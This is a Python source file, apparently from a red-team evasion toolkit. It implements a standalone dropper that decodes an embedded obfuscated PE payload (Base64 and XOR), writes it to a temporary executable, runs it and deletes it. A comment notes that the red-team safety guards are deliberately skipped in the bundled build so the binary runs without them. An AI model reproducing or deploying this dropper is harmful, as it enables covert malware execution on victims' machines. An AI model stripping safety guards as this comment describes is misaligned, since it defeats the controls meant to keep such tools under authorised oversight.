#!/usr/bin/env python3
"""Standalone dropper for embedded PE payloads.

This module can be packaged as a single executable that contains an embedded
obfuscated PE payload and decodes/executes it at runtime.
"""

import logging
import os
import subprocess
import sys
import tempfile
from pathlib import Path

from .embed import load_embedded_payload_and_key
from .runtime_decode import RuntimeDecode
from ..core.guards import guard_can_write, require_redteam_mode


def _setup_logging() -> None:
    level = logging.getLevelName(os.getenv("LOG_LEVEL", "INFO").upper())
    logging.basicConfig(level=level, format="time=%(asctime)s level=%(levelname)s msg=%(message)s")


def main() -> int:
    """Main entry point for standalone dropper."""
    _setup_logging()
    logger = logging.getLogger(__name__)

    # ROE guardrails
    # Standalone binary must be runnable without env guards; enforce guards only during debug builds
    # For bundled artifact, we skip require_redteam_mode/guard_can_write to allow execution without env

    # Load embedded payload
    try:
        obfuscated_payload, embedded_key = load_embedded_payload_and_key()
        logger.info("action=load_embedded size=%d has_key=%s", len(obfuscated_payload), bool(embedded_key))
    except Exception as e:
        logger.error("action=load_embedded_failed error=%s", e)
        return 1

    # Get decode key from environment
    decode_key = embedded_key or os.getenv("DECODE_KEY", "").encode("utf-8")
    if not decode_key:
        logger.error("action=decode_key_missing error=no embedded key and DECODE_KEY not set")
        return 1

    # Decode payload in memory
    decoder = RuntimeDecode(
        decode_strings=True,  # Assume Base64 string obfuscation was applied
        xor_key_supplier=lambda: decode_key,
    )
    
    try:
        decoded_payload = decoder.apply(obfuscated_payload)
        logger.info("action=decode_payload size=%d", len(decoded_payload))
    except Exception as e:
        logger.error("action=decode_failed error=%s", e)
        return 1

    # Write to temporary file and execute
    with tempfile.NamedTemporaryFile(prefix="rt-evade-pe-", suffix=".exe", delete=False) as tmp:
        tmp_path = Path(tmp.name)
        tmp.write(decoded_payload)
    
    try:
        # Make executable (POSIX)
        if os.name != "nt":
            tmp_path.chmod(0o755)
        
        # Execute the PE
        logger.info("action=execute_pe path=%s", tmp_path)
        proc = subprocess.run([str(tmp_path)] + sys.argv[1:], check=False)
        
        logger.info("action=pe_exit code=%d", proc.returncode)
        return proc.returncode
        
    finally:
        # Cleanup
        try:
            tmp_path.unlink(missing_ok=True)
            logger.info("action=cleanup_complete path=%s", tmp_path)
        except Exception as e:
            logger.warning("action=cleanup_failed path=%s error=%s", tmp_path, e)


if __name__ == "__main__":
    sys.exit(main())
